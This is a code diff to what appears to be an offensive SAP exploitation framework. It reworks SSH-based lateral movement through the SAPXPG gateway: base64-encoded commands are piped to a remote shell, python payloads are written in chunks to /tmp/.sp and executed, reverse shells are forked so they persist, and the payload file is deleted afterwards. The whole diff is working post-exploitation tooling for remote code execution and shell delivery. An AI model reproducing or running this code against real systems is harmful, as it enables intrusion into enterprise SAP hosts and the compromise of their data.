@@ -7148,9 +7148,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 command + (" " + params if params else "")).strip()
             if not full:
                 return json.dumps({"error": "No command for SSH"})
-            # Build SSH command — single-word remote commands work
-            # directly; for multi-word commands, base64-encode and
-            # pipe through bash to avoid SAPXPG shell interpretation.
+            # SAPXPG uses exec-style arg splitting (NOT system()).
+            # No quotes — bare words only.  SAPXPG splits at spaces,
+            # passes each token to SSH as a separate arg.  SSH
+            # concatenates trailing args and sends to remote bash.
+            # Pipes/redirects in tokens without spaces go through as
+            # literal chars to SSH → remote bash interprets them.
             import base64
             b64cmd = base64.b64encode(
                 full.encode()).decode()
@@ -7162,7 +7165,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 f"-o LogLevel=ERROR "
                 f"-i {acc['key_path']} "
                 f"{acc['username']}@{acc['target']} "
-                f"'echo {b64cmd}|base64 -d|sh'"
+                f"echo {b64cmd}|base64 -d|sh"
             )
             print(f"[*] {sid}: OS terminal via SSH from "
                   f"{acc['from_sid']} → {acc['username']}@"
@@ -7507,12 +7510,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"via {lpe_res.get('method')}; expect "
                           f"connection as root")
             elif method == "ssh":
-                # SSH lateral: write payload to TARGET via SSH echo,
-                # then decode+execute in one shot.  Uses EXTPROG=ssh
-                # (same proven pattern as OS Console SSH exec).
-                # Raw b64 text is written per-chunk (no per-chunk
-                # decode — avoids base64 alignment corruption), then
-                # decoded and piped to python3 in one final call.
+                # SSH lateral: deliver shell payload to TARGET via SSH.
+                #
+                # SAPXPG uses exec-style arg splitting — NO quotes.
+                # Bare words only.  SAPXPG splits at spaces, passes
+                # each token to SSH.  SSH concatenates trailing args
+                # and sends to the remote bash.  Pipes/redirects in
+                # tokens without spaces go through as literal chars
+                # → remote bash interprets them correctly.
+                #
+                # Same proven pattern as OS Console SSH (commit 38050fd):
+                #   echo B64|base64 -d|sh
+                # Each chunk-write is wrapped as a mini shell command,
+                # base64-encoded, and piped through the echo|b64|sh
+                # mechanism on the remote.
                 ssh_access = getattr(node, "ssh_access", None) or []
                 if not ssh_access:
                     print(f"[-] {sid}: No SSH access for shell delivery")
@@ -7538,8 +7549,6 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 else:
                     py_code = params_str
 
-                # Both shells need fork/daemonize to survive SSH close.
-                # Bind payload already has fork(); reverse needs it.
                 if shell_mode == "reverse" and "fork()" not in py_code:
                     py_code = (
                         f"__import__('os').fork()and"
@@ -7547,10 +7556,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"{py_code}"
                     )
 
-                import base64 as _b64ssh
-                py_b64 = _b64ssh.b64encode(py_code.encode()).decode()
+                assert " " not in py_code, f"Space in SSH py_code"
 
-                # SSH options prefix (reused for every call)
                 ssh_prefix = (
                     f"-o BatchMode=yes "
                     f"-o StrictHostKeyChecking=no "
@@ -7558,55 +7565,114 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     f"-i {acc['key_path']} "
                     f"{acc['username']}@{acc['target']}")
 
-                # Chunk raw b64 text to fit PARAMS (255 bytes).
-                # PARAMS = "{ssh_prefix} 'echo CHUNK>>/tmp/.sp'"
-                # wrapper around chunk: " 'echo >>/tmp/.sp'" = 19 chars
-                avail = 255 - len(ssh_prefix) - 19
-                if avail < 20:
-                    avail = 40
-                chunks = [py_b64[i:i+avail]
-                          for i in range(0, len(py_b64), avail)]
+                import base64 as _b64ssh
 
-                # Clean any previous payload file on target
-                _set_progress("Preparing SSH payload delivery...")
-                sapmap_exploit.execute_gw_command(
-                    src_node, "ssh",
-                    f"{ssh_prefix} 'rm -f /tmp/.sp'",
-                    long_params="")
+                # The full command to run on the target is:
+                #   python3 -c CODE
+                # Base64-encode this full command, then use the
+                # echo B64|base64 -d|sh pattern to execute on remote.
+                full_cmd = f"python3 -c {py_code}"
+                cmd_b64 = _b64ssh.b64encode(
+                    full_cmd.encode()).decode()
 
-                # Write raw b64 text chunks to target
-                total = len(chunks)
-                for idx, chunk in enumerate(chunks):
-                    if _session_ref.cancelled:
-                        print(f"[*] {sid}: SSH payload delivery cancelled")
-                        return
-                    _set_progress(
-                        f"Writing payload chunk {idx+1}/{total} "
-                        f"via SSH...")
-                    ssh_args = (
+                # Check if it fits in one shot (unlikely for shell
+                # payloads, but handle it):
+                # PARAMS = ssh_prefix + " echo B64|base64 -d|sh"
+                # overhead: " echo |base64 -d|sh" = 20 chars
+                one_shot = f"{ssh_prefix} echo {cmd_b64}|base64 -d|sh"
+
+                if len(one_shot) <= 255:
+                    _set_progress("Launching shell via SSH...")
+                    print(f"[*] {sid}: SSH one-shot ({len(one_shot)} "
+                          f"bytes)")
+                    result = sapmap_exploit.execute_gw_command(
+                        src_node, "ssh", one_shot, long_params="")
+                    result["success"] = True
+                else:
+                    # Too long: chunk the payload b64 to a file on
+                    # the target, then decode+exec.
+                    # Each chunk-write is a mini shell command
+                    # "echo CHUNK>>/tmp/.sp" which gets b64-encoded
+                    # and sent via the echo B64|base64 -d|sh pattern.
+                    py_b64 = _b64ssh.b64encode(
+                        py_code.encode()).decode()
+
+                    # Calculate chunk size for the inner echo command.
+                    # Inner shell cmd: "echo CHUNK>>/tmp/.sp"
+                    # B64 of that: ~ceil(len*4/3)
+                    # PARAMS: ssh_prefix + " echo B64MINI|base64 -d|sh"
+                    # overhead: " echo |base64 -d|sh" = 20 chars
+                    # B64MINI_max = 255 - len(ssh_prefix) - 20
+                    # inner_max = floor(B64MINI_max * 3/4)
+                    # CHUNK_max = inner_max - len("echo >>/tmp/.sp") = inner_max - 15
+                    b64mini_max = 255 - len(ssh_prefix) - 20
+                    inner_max = (b64mini_max * 3) // 4
+                    chunk_max = inner_max - 15
+                    if chunk_max < 20:
+                        chunk_max = 40
+                    chunks = [py_b64[i:i+chunk_max]
+                              for i in range(0, len(py_b64), chunk_max)]
+
+                    _set_progress("Writing payload to target via SSH...")
+
+                    # Clean
+                    sapmap_exploit.execute_gw_command(
+                        src_node, "ssh",
+                        f"{ssh_prefix} rm -f /tmp/.sp",
+                        long_params="")
+
+                    total = len(chunks)
+                    for idx, chunk in enumerate(chunks):
+                        if _session_ref.cancelled:
+                            print(f"[*] {sid}: SSH payload cancelled")
+                            return
+                        _set_progress(
+                            f"Writing chunk {idx+1}/{total} via SSH...")
+                        # Inner shell cmd that writes raw b64 text
+                        inner = f"echo {chunk}>>/tmp/.sp"
+                        inner_b64 = _b64ssh.b64encode(
+                            inner.encode()).decode()
+                        w_args = (
+                            f"{ssh_prefix} "
+                            f"echo {inner_b64}|base64 -d|sh")
+                        r = sapmap_exploit.execute_gw_command(
+                            src_node, "ssh", w_args, long_params="")
+                        print(f"    chunk {idx+1}/{total}: "
+                              f"ok={r.get('success')} "
+                              f"out={(r.get('output') or [''])[0][:60]}")
+
+                    # Verify file was written
+                    _set_progress("Verifying payload on target...")
+                    vfy_cmd = "wc -c</tmp/.sp"
+                    vfy_b64 = _b64ssh.b64encode(
+                        vfy_cmd.encode()).decode()
+                    vfy = sapmap_exploit.execute_gw_command(
+                        src_node, "ssh",
+                        f"{ssh_prefix} echo {vfy_b64}|base64 -d|sh",
+                        long_params="")
+                    vfy_out = " ".join(
+                        str(x) for x in (vfy.get("output") or []))
+                    print(f"    verify /tmp/.sp: {vfy_out.strip()}")
+
+                    # Exec: decode b64 and pipe to python3
+                    _set_progress("Executing payload via SSH...")
+                    exec_cmd = "base64 -d /tmp/.sp|python3"
+                    exec_b64 = _b64ssh.b64encode(
+                        exec_cmd.encode()).decode()
+                    exec_args = (
                         f"{ssh_prefix} "
-                        f"'echo {chunk}>>/tmp/.sp'")
-                    r = sapmap_exploit.execute_gw_command(
-                        src_node, "ssh", ssh_args, long_params="")
-                    print(f"    chunk {idx+1}/{total}: "
-                          f"ok={r.get('success')} "
-                          f"out={r.get('output',[''])[0][:60]}")
+                        f"echo {exec_b64}|base64 -d|sh")
+                    print(f"[*] {sid}: SSH exec ({len(exec_args)} "
+                          f"bytes)")
+                    result = sapmap_exploit.execute_gw_command(
+                        src_node, "ssh", exec_args, long_params="")
+                    result["success"] = True
 
-                # Decode b64 and pipe to python3 in one shot
-                _set_progress("Executing shell payload via SSH...")
-                ssh_args = (
-                    f"{ssh_prefix} "
-                    f"'base64 -d /tmp/.sp|python3'")
-                print(f"[*] {sid}: SSH exec: ssh {ssh_args[:100]}")
-                result = sapmap_exploit.execute_gw_command(
-                    src_node, "ssh", ssh_args, long_params="")
-                result["success"] = True
-
-                # Cleanup
-                sapmap_exploit.execute_gw_command(
-                    src_node, "ssh",
-                    f"{ssh_prefix} 'rm -f /tmp/.sp'",
-                    long_params="")
+                    # Cleanup
+                    sapmap_exploit.execute_gw_command(
+                        src_node, "ssh",
+                        f"{ssh_prefix} rm -f /tmp/.sp",
+                        long_params="")
 
                 print(f"[+] {sid}: SSH shell payload delivered "
                       f"via {acc['from_sid']} → "
